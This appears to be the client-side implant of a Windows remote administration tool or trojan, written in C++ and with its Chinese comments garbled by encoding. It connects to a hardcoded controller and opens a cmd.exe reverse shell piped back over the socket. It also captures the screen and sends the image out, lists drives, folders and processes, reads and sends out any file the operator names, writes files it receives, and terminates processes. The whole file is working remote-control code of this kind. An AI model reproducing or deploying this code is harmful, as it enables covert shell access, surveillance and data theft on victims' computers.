// Server.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "../../common/common.h"
#include <Winsock2.h>
#include <string>
#include <process.h>
#include <Psapi.h>
#include <tlhelp32.h>

//#include "Cryption/base64.h"
// #include "Cryption/zip.h"
// #pragma comment(lib, "zlib.lib")

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "psapi.lib")

//�����һ�����
//�׽��� socket
SOCKET g_Client;
HANDLE g_hWrite;
HANDLE g_hThread;

CString g_strFileDownLoad;
CString g_strFileUpLoad;
CString g_strUpLoadPath;

char g_szFilePath[MAX_PATH];

CRITICAL_SECTION g_cs;

// 
// int OnStartCmd(char* pBuf , int nBufSize = 0);
// int OnHandleCmdData(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleHeart(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleScreenData(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleExplorerStart(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleDriveInfo(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleFilesOfDir(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleDownLoadFiles(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleProcInfoData(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleProcStart(char* pBuf = NULL, int nBufSize = 0);
// int OnHandleProcTerminate(char* pBuf = NULL, int nBufSize = 0);
// 
// typedef int(*PNF_ONCMD)(char* pBuf, int nBufSize);
// 
// #define On_COMMAND(n, pfn) {n, &pfn},
// 
// struct tagCommand
// {
//   int nCommand;     // 
//   PNF_ONCMD pfnCmd; // 
// };
// 
// tagCommand pfnCmdAry[] = {
//   On_COMMAND(CMD_REQ, OnStartCmd)
//   On_COMMAND(CMD_DATA, OnHandleCmdData)
//   On_COMMAND(HEART_REQ, OnHandleHeart)
//   On_COMMAND(SCREEN_REQ, OnHandleScreenData)
//   On_COMMAND(SCREEN_REQ, OnHandleScreenData)
//   On_COMMAND(FILE_REQ, OnHandleExplorerStart)
//   On_COMMAND(FILE_LOGICDRIVE_DATA_REQ, OnHandleDriveInfo)
//   On_COMMAND(FILE_LIST_DATA_REQ, OnHandleFilesOfDir)
//   On_COMMAND(FILE_DOWNLOAD_REQ, OnHandleDownLoadFiles)
//   On_COMMAND(PROCESS_DATA_REQ, OnHandleProcInfoData)
// };
// 

bool ConnectServer(char* pServerIP, int nPort)
{
  WORD wVersionRequested;
  WSADATA wsaData;
  int err;

  wVersionRequested = MAKEWORD(2, 2);

  err = WSAStartup(wVersionRequested, &wsaData);
  if (err != 0) {
    return false;
  }

  if (LOBYTE(wsaData.wVersion) != 2 ||
    HIBYTE(wsaData.wVersion) != 2) {
    WSACleanup();
    return false;
  }

  //1. ����TCP socket
  g_Client = socket(AF_INET,
    SOCK_STREAM, //��ʽ����
    IPPROTO_TCP);

  //2. �󶨶˿� bind
  //sockaddr addr;
  sockaddr_in addr = { 0 };
  addr.sin_family = AF_INET;
  addr.sin_port = htons(nPort); // htonl
  addr.sin_addr.S_un.S_addr = inet_addr(pServerIP);

  int nRet = connect(g_Client, (sockaddr*)&addr, sizeof(sockaddr));

  if (nRet == SOCKET_ERROR)
  {
    return false;
  }

  return true;
}

BOOL CreateChildProcess(HANDLE hRead, HANDLE hWrite)
{
  PROCESS_INFORMATION piProcInfo;
  STARTUPINFO siStartInfo;

  // Set up members of the PROCESS_INFORMATION structure. 

  ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

  // Set up members of the STARTUPINFO structure. 

  ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
  siStartInfo.cb = sizeof(STARTUPINFO);
  siStartInfo.hStdInput = hRead;
  siStartInfo.hStdOutput = hWrite;
  siStartInfo.hStdError = hWrite;
  siStartInfo.dwFlags = STARTF_USESTDHANDLES;
  // Create the child process. 

  TCHAR szCmd[] = _T("cmd");

  return CreateProcess(NULL,
    szCmd,       // command line 
    NULL,          // process security attributes 
    NULL,          // primary thread security attributes 
    TRUE,          // handles are inherited 
    0,             // creation flags 
    NULL,          // use parent's environment 
    NULL,          // use parent's current directory 
    &siStartInfo,  // STARTUPINFO pointer 
    &piProcInfo);  // receives PROCESS_INFORMATION 
}

//���̻߳ص�����
DWORD ThreadFunc(LPVOID lpParam)
{
  HANDLE hMyRead = (HANDLE)lpParam;

  //��hMyRead��ȡ���
  char szOutput[256] = { 0 };
  DWORD dwReadedBytes = 0;
  while (true)
  {
    memset(szOutput, 0, 256);
    BOOL bRet = ReadFile(hMyRead,
      szOutput,
      255,
      &dwReadedBytes,
      NULL);
    if (!bRet || dwReadedBytes == 0)
    {
      break;
    }

    //��ʾ����Ľ��
    //printf("%s", szOutput);
    //OutputDebugStringA(szOutput);
    //�����ݷ��͸������.

    // ѹ��szOutput
    unsigned int nOldBufSize = strlen(szOutput) + 1;

    // ����ѹ����Ļ���������
    // ���������ѹ���󻺳�����С
//     uLong nNewSize = compressBound(nOldBufSize);
// 
//     Bytef* pResByte = new Bytef[nNewSize];
//     ZeroMemory(pResByte, nNewSize);
// 
//     int nRet = compress(pResByte, &nNewSize, (Bytef*)szOutput, nOldBufSize);
//     if (Z_OK != nRet)
//     {
//       if (pResByte != NULL)
//       {
//         delete pResByte;
//         pResByte = NULL;
//       }
// 
//       check_error(nRet);
// 
//       break;
//     }
//     
// 
//     *(uLong*)&(pResByte[nNewSize]) = nOldBufSize;
// 
//     nNewSize += sizeof(uLong);
// 
//     SendPacket(g_Client, CMD_DATA_RLY, (PCHAR)pResByte, nNewSize);

    Sleep(10);
    //send(g_Client, szOutput, dwReadedBytes, 0);
    SendPacket(g_Client, CMD_DATA_RLY, szOutput, dwReadedBytes);

//     if (pResByte != NULL)
//     {
//       delete pResByte;
//       pResByte = NULL;
//     }
  }

  return 0;
}

int OnStartCmd()
{
  //������Ҫ����һ���µ�socket
  //��������cmd.exe����ͨѶ
  SECURITY_ATTRIBUTES saAttr;

  saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
  saAttr.bInheritHandle = TRUE;
  saAttr.lpSecurityDescriptor = NULL;

  HANDLE hMyWrite;
  HANDLE hCmdRead;
  HANDLE hMyRead;
  HANDLE hCmdWrite;

  if (!CreatePipe(&hCmdRead, &hMyWrite, &saAttr, 0))
  {
    return 0;
  }

  if (!CreatePipe(&hMyRead, &hCmdWrite, &saAttr, 0))
  {
    return 0;
  }

  g_hWrite = hMyWrite;
  BOOL bRet = CreateChildProcess(hCmdRead, hCmdWrite);

  //����һ�����߳�
  g_hThread = CreateThread(NULL,
    0,
    (LPTHREAD_START_ROUTINE)ThreadFunc,
    hMyRead,
    0,
    NULL);

  SendPacket(g_Client, CMD_RLY);
  //send(g_Client, szOutput, dwReadedBytes, 0);

  return 0;
}

int OnHandleCmdData(char* pBuf, int nBufSize)
{
  char szInput[256] = { 0 };

  DWORD dwWritedBytes = 0;
  DWORD dwReadedBytes = 0;


  //д�뵽hMyWrite
  BOOL bRet = WriteFile(g_hWrite,
    pBuf,
    nBufSize,
    &dwWritedBytes,
    NULL);
  if (!bRet)
  {
    return false;
  }

  return true;
}

// ��������
int OnHandleHeart()
{
#ifdef NO_HEARTBEAT
  //��������
  SendPacket(g_Client, HEART_RLY);
#endif
  return 0;
}

// ��Ļ��ͼ
int OnHandleScreenData()
{
  //��ȡ��Ļ������,��������
  int nWidth = GetSystemMetrics(SM_CXSCREEN);
  int nHeight = GetSystemMetrics(SM_CYSCREEN);

  HWND hWnd = GetDesktopWindow();
  if (hWnd == NULL)	
  {
    return 0;
  }


  //��ȡ�����DC
  HDC hDesktop = GetDC(hWnd);
  if (hDesktop == NULL)	
  {
    ReleaseDC(hWnd, hDesktop);
    return 0;
  }

  //����һ������������ڴ��DC
  HDC hMemDC = CreateCompatibleDC(hDesktop);
  if (hMemDC == 0)
  {
    //�ͷ���Դ
    DeleteDC(hMemDC);
    ReleaseDC(hWnd, hDesktop);
    return 0;
  }

  //����һ�����������λͼ
  HBITMAP hBitmap = CreateCompatibleBitmap(hDesktop,
    nWidth,
    nHeight);
  if (hBitmap == NULL)
  {
    //�ͷ���Դ
    DeleteDC(hMemDC);
    ReleaseDC(hWnd, hDesktop);
    DeleteObject(hBitmap);
    return 0;
  }

  //���ڴ�dcѡ��λͼ
  HGDIOBJ hOldBitmap = SelectObject(hMemDC, hBitmap);
  if (hOldBitmap == NULL || hOldBitmap == HGDI_ERROR)
  {
    //�ͷ���Դ
    DeleteDC(hMemDC);
    ReleaseDC(hWnd, hDesktop);
    DeleteObject(hBitmap);
    return 0;
  }

  //����BitBlt ���������Ļ���ݿ�����memDC��
  BOOL bRet = BitBlt(hMemDC,
    0,
    0,
    nWidth,
    nHeight,
    hDesktop,
    0,
    0,
    SRCCOPY);
  if (!bRet)
  {
    //�ͷ���Դ
    DeleteDC(hMemDC);
    ReleaseDC(hWnd, hDesktop);
    DeleteObject(hBitmap);
    return 0;
  }

  //��memdc��ȡ����
  unsigned int dwBitmapSize = nHeight * nWidth * sizeof(COLORREF);
  unsigned int nBufSize = dwBitmapSize + sizeof(int) * 2;

  char* pBuf = new char[nBufSize];
  if (pBuf == NULL)
  {
    //�ͷ���Դ
    if (pBuf != NULL)
    {
      delete[] pBuf;
    }

    DeleteDC(hMemDC);
    ReleaseDC(hWnd, hDesktop);
    DeleteObject(hBitmap);
    return 0;
  }

  (int&)*pBuf = nWidth;
  (int&)*(pBuf + 4) = nHeight;

  LONG lBytesCopied = GetBitmapBits(hBitmap, dwBitmapSize, pBuf + sizeof(int) * 2);
  if (lBytesCopied == 0)
  {
    //�ͷ���Դ
    if (pBuf != NULL)
    {
      delete[] pBuf;
    }
    DeleteDC(hMemDC);
    ReleaseDC(hWnd, hDesktop);
    DeleteObject(hBitmap);
    return 0;
  }
  

  //��������
  SendPacket(g_Client, SCREEN_RLY, (PCHAR)pBuf, nBufSize);

  //�ͷ���Դ
  if (pBuf != NULL)
  {
    delete[] pBuf;
  }
  DeleteDC(hMemDC);
  ReleaseDC(hWnd, hDesktop);
  DeleteObject(hBitmap);

  return 0;
}

// �����ļ���Ϣ
int OnHandleExplorerStart()
{
  SendPacket(g_Client, FILE_RLY);
  return 0;
}

// ���ʹ�����Ϣ
int OnHandleDriveInfo()
{
  char buf[100];
  DWORD len = GetLogicalDriveStrings(sizeof(buf) / sizeof(TCHAR), buf);
  char *s = buf;
  unsigned int nDriveType(0);
  CString strSendData("");
  CString strDisks;

  for (; *s; s += strlen(s) + 1)
  {
    strDisks = s; //�����̷� 
    nDriveType = GetDriveType(strDisks);
    switch (nDriveType)
    {
      case DRIVE_FIXED:
        OutputDebugStringA(strDisks);
        //aryLogicDrive.Add(strDisks);
        strSendData.Append(strDisks);
        strSendData.Append("||");
    }
  }
  
  SendPacket(g_Client, FILE_LOGICDRIVE_DATA_RLY, (char*)(strSendData.GetString()), strSendData.GetLength() + 1);

  return 0;
}

// �ظ�ָ���ļ������ļ���Ϣ������
int OnHandleFilesOfDir(PBYTE pszDirName, int nDirNameLen)
{
  CString strAllFiles;
  CString strFilePath(pszDirName);
  CFileFind findFile;
  CString Dir = strFilePath + "\\*.*";

  BOOL res = findFile.FindFile(Dir);
  if (!res)
  {
    return 0;
  }

  while (res)
  {
    CString strFilename;
    CString strTmp;
    res = findFile.FindNextFile();
    //if (findPath.IsDirectory()/* && !strFind.IsDots()*/) //Ŀ¼���ļ��� 
    {
      strFilename = findFile.GetFileName();
      strTmp = Dir.Left(Dir.GetLength() - 3) + strFilename;

      //ִ�к������� 
      //OutputDebugStringA(strFilename);
      strAllFiles.Append(strFilename);
      if (findFile.IsDirectory())
      {
        // ������ļ��У����Ϊ0
        strAllFiles.Append("--0||");
      }
      else
      {
        // ��������ļ��У����Ϊ1
        strAllFiles.Append("--1||");
      }
      continue;
    }
  }

  SendPacket(g_Client, FILE_LIST_DATA_RLY, LPSTR(strAllFiles.GetString()), strAllFiles.GetLength()+1);
  
  return 0;
}

// ��ʾ�յ��������ļ�������
int OnHandleStartDownLoad(PCHAR pszFileName, int nFileLen)
{
  // ����Ѿ����ڣ�ֱ�Ӹ���
  //strcat(pszFileName, "-dl");
  HANDLE hFile = CreateFile(pszFileName,
    GENERIC_ALL,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL,
    CREATE_NEW,
    FILE_ATTRIBUTE_NORMAL,
    NULL);
  if (INVALID_HANDLE_VALUE == hFile)
  {
    if (ERROR_ALREADY_EXISTS == GetLastError() | ERROR_FILE_EXISTS == GetLastError())
    {
      // ����Ѵ��ھ�ɾ��
      CloseHandle(hFile);
      hFile = INVALID_HANDLE_VALUE;
      DeleteFile(pszFileName);
    }
  }

  memset(g_szFilePath, 0, MAX_PATH);
  strcpy(g_szFilePath, pszFileName);

  // �ͻ����Ѿ�׼��������
  SendPacket(g_Client, FILE_DOWNLOAD_RLY, pszFileName, nFileLen);

  return 0;
}

// �����߳�
DWORD DownLoadProc(LPVOID lpThreadParameter)
{
  //CString* pStrFileContent = reinterpret_cast<CString*>(lpThreadParameter);
  //char* pStrFileContent = reinterpret_cast<char*>(lpThreadParameter);
  //char* pTmp = g_strFile.GetBuffer(0);

  char* pStrFileContent = g_strFileDownLoad.GetBuffer();

  HANDLE hFile = CreateFile(g_szFilePath,
    GENERIC_ALL,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL);
  if (INVALID_HANDLE_VALUE == hFile)
  {
    // �ͻ��˴�Ŀ���ļ�ʧ��
    return 0;
  }

  DWORD lpNumberOfBytesWritten = 0;
  size_t dwLen = strlen(pStrFileContent);
  BOOL bRet = WriteFile(hFile, pStrFileContent, dwLen, &lpNumberOfBytesWritten, NULL);
  if (!bRet)
  {
    // �ͻ��˴�Ŀ���ļ�ʧ��
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;
    return 0;
  }

  CloseHandle(hFile);
  hFile = INVALID_HANDLE_VALUE;

  return 0;
}

// ��ʾ�յ��������ļ�������
int OnHandleDownLoadData(PCHAR pszFileContent, unsigned int nFileLen)
{
  g_strFileDownLoad.Format("%s", pszFileContent);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DownLoadProc, (LPVOID)&pszFileContent, 0, NULL);

  return 0;
}

// �����߳�,�ӿͻ��˶�ȡĿ���ļ����ݣ����͵������
DWORD UpLoadProc(LPVOID lpThreadParameter)
{
  PCHAR pszFilePath = reinterpret_cast<PCHAR>(lpThreadParameter);

  EnterCriticalSection(&g_cs);

  // ��ָ���ļ������ݣ����͵�������
  HANDLE hFile = CreateFile(g_strUpLoadPath.GetString(),
    GENERIC_READ,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL, // security_attribute struct
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL);

  DWORD dwFileSizeHigh = 0;
  DWORD dwFileSizeLow = GetFileSize(hFile, &dwFileSizeHigh);
  
  // ��С������4G
  char* pszFileContent = g_strFileUpLoad.GetBuffer(dwFileSizeLow+1);
  pszFileContent[dwFileSizeLow] = 0;
  
  DWORD dwReaded = 0;
  ReadFile(hFile, pszFileContent, dwFileSizeLow, &dwReaded, (LPOVERLAPPED)NULL);

  SendPacket(g_Client, FILE_UPLOAD_DATA_RLY, pszFileContent, dwReaded);

  // ȫ��������
  g_strUpLoadPath.Empty();
  g_strFileUpLoad.ReleaseBuffer(); 
  CloseHandle(hFile);
  hFile = INVALID_HANDLE_VALUE;

  LeaveCriticalSection(&g_cs);

  return 0;
}

// ��ʾ�յ����ϴ��ļ�׼������
int OnHandleUpLoadData(PCHAR pszFilePath, unsigned int nFileLen)
{
  g_strUpLoadPath.Format("%s", pszFilePath);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)UpLoadProc, (LPVOID)&pszFilePath, 0, NULL);

  return 0;
}

// �����ͻ��˽�����Ϣ
int OnHandleProcInfoData()
{
  PROCESSENTRY32 pe32;
  // ��ʹ������ṹ֮ǰ�����������Ĵ�С
  pe32.dwSize = sizeof(pe32);

  // ��ϵͳ�ڵ����н�����һ������
  HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE)
  {
    OutputDebugStringA(" CreateToolhelp32Snapshot����ʧ��!");
    return -1;
  }

  std::string strAllProInfo;

  // �������̿��գ�������ʾÿ�����̵���Ϣ
  // ��ʽ������ID0:������0|����ID1:������1|... 
  USES_CONVERSION;
  BOOL bMore = ::Process32First(hProcessSnap, &pe32);
  while (bMore)
  {
    char buf[0x200] = { 0 };
    sprintf(buf, "%s:%d|", /*W2A*/(pe32.szExeFile), pe32.th32ProcessID);
    OutputDebugStringA(buf);
    strAllProInfo.append(buf);

    bMore = ::Process32Next(hProcessSnap, &pe32);
  }
  // ��Ҫ���������snapshot����
  ::CloseHandle(hProcessSnap);

  SendPacket(g_Client, PROCESS_DATA_RLY, (PCHAR)strAllProInfo.c_str(), strAllProInfo.length() + 1);

  return 0;
}

// ������Ϣ���俪ʼ
int OnHandleProcStart()
{
  SendPacket(g_Client, PROCESS_RLY);

  return 0;
}

// ��ʼ��������
int OnHandleProcTerminate(char* pBuf, int nBufSize)
{
  DWORD dwId = atoi(pBuf);
  if (dwId < 4)
  {
    SendPacket(g_Client, PROCESS_CLS_RLY_FAIL, pBuf, nBufSize);
    return 0;
  }

  // �򿪽���
  HANDLE hProc = INVALID_HANDLE_VALUE;
  hProc = OpenProcess(PROCESS_ALL_ACCESS, false, dwId);
  if (hProc == INVALID_HANDLE_VALUE)
  {
    SendPacket(g_Client, PROCESS_CLS_RLY_FAIL, pBuf, nBufSize);
    return 0;
  }

  // ��������
  BOOL bRet = FALSE;
  bRet = TerminateProcess(hProc, 0);
  if (!bRet)
  {
    SendPacket(g_Client, PROCESS_CLS_RLY_FAIL, pBuf, nBufSize);
    return 0;
  }

  SendPacket(g_Client, PROCESS_CLS_RLY_SCS, pBuf, nBufSize);

  return 0;
}

unsigned int __stdcall HeartBeatProc(void* lpram)
{
#ifdef NO_HEARTBEAT
  while (true)
  {
    SendPacket(g_Client, HEART_RLY);
    Sleep(2 * 1000);
  }
#endif

  return 0;
}

int _tmain(int argc, _TCHAR* argv[])
{
  bool bRet = ConnectServer("127.0.0.1", 10086);
  if (!bRet)
  {
    return 0;
  }

  InitializeCriticalSection(&g_cs);

  _beginthreadex(0, 0, HeartBeatProc, NULL, 0, 0);

  while (true)
  {
    unsigned char nType(0);
    CBuffer strRecv;
    int nBufSize(0);
    int nRecvedBytes(0);
    //ZeroMemory(pTmpBuf, BUF_SIZE);

    bool bRet = ClientRecvPacket(g_Client, 
      //pTmpBuf, 
      nType, 
      strRecv, 
      nBufSize, 
      nRecvedBytes); // ���ض��˵ĳ���
      
    if (bRet)
    {
      PBYTE pBuf = strRecv.GetBuffer();
      //��ʾ�յ�������
      switch (nType)
      {
        case CMD_REQ:
        {
          //��ʾ�յ��˿���cmd������
          OnStartCmd();
        }
          break;

        case CMD_DATA:
        {
          //��ʾ�յ���ִ��cmd�����е�����
          OnHandleCmdData((PCHAR)pBuf, nBufSize);
        }
          break;

        case SCREEN_REQ:
        {
          OnHandleScreenData();
        }
          break;

        // ��ʾ���������ļ���Ϣ����
        case FILE_REQ:
        {
          OnHandleExplorerStart();
        }
          break;

          // ��ʾ����ظ�������Ϣ
        case FILE_LOGICDRIVE_DATA_REQ:
        {
          OnHandleDriveInfo();
        }
          break;

        case FILE_LIST_DATA_REQ:
        {
          // ��ʾ�յ��˻ظ�ָ���ļ������ļ���Ϣ������
          OnHandleFilesOfDir(pBuf, nBufSize);
        }
          break;

        case FILE_DOWNLOAD_REQ:
        {
          // ��ʾ�յ��������ļ�������
          OnHandleStartDownLoad((PCHAR)pBuf, nBufSize);
        }
          break;

        case FILE_DOWNLOAD_DATA_RLY:
        {
          // ��ʾ�յ���Ҫ�����ļ�����Ϣ
          OnHandleDownLoadData((PCHAR)pBuf, nBufSize);
        }
          break;

        case FILE_UPLOAD_REQ:
        {
          // ��ʾ�յ���׼���ϴ��ļ�������
          OnHandleUpLoadData((PCHAR)pBuf, nBufSize); // D:\\123.txt
        }
          break;
//////////////////////////////////////////////////////////////////////////
        case PROCESS_REQ:
        {
          OnHandleProcStart();
        }
          break;

        case PROCESS_DATA_REQ:
        {
          // �յ����������ͽ�����Ϣ������
          OnHandleProcInfoData();
        }
          break;

        case PROCESS_CLS:
        {
          // �յ��������������̵�����
          OnHandleProcTerminate((PCHAR)pBuf, nBufSize);
        }
          break;

        case HEART_REQ:
        {
          // ����������
          OnHandleHeart();
        }
          break;
      }

      //ɾ��һ�������İ�
      strRecv.Delete(nBufSize);

    }
    else
    {
      break;
    }
  }

  DeleteCriticalSection(&g_cs);
  closesocket(g_Client);
  WSACleanup();

  return 0;
}

